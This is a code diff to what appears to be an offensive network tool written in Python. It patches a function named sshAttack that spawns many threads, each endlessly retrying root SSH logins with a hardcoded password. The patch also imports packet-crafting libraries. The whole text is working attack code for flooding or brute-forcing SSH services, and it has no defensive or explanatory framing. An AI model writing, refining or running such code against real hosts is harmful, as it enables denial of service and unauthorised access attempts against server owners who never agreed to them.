@@ -10,6 +10,8 @@ from urllib.request import Request
 from paramiko import SSHClient
 import impacket.ImpactPacket
 import warnings
+
+from paramiko.client import AutoAddPolicy
 from scapy.layers.inet import TCP, IP
 from scapy.sendrecv import send, sr1
 
@@ -249,14 +251,22 @@ def sshAttack(host, port, thread):
     colormsg("Thread Start!", "yellow")
 
     def get(host, port):
+        host = gethostbyname(host)
+        ssh = None
         while True:
             try:
-                SSHClient().connect(hostname=host, port=port, username="root", password='1145141919810FUCKU')
+                ssh = SSHClient()
+                try:
+                    ssh.load_system_host_keys()
+                except:
+                    colormsg('请获取SSH的Host Key或安装SSH','red')
+                ssh.connect(hostname=host, port=port, username="root", password='1145141919810FUCKU')
                 colormsg("Success", 'green')
             except Exception as e:
                 colormsg(f"Failed.{e}", 'red')
             finally:
                 sleep(0)
+                ssh.close()
 
     for i in range(1, thread + 1):
         _thread.start_new_thread(get, (host, port,))
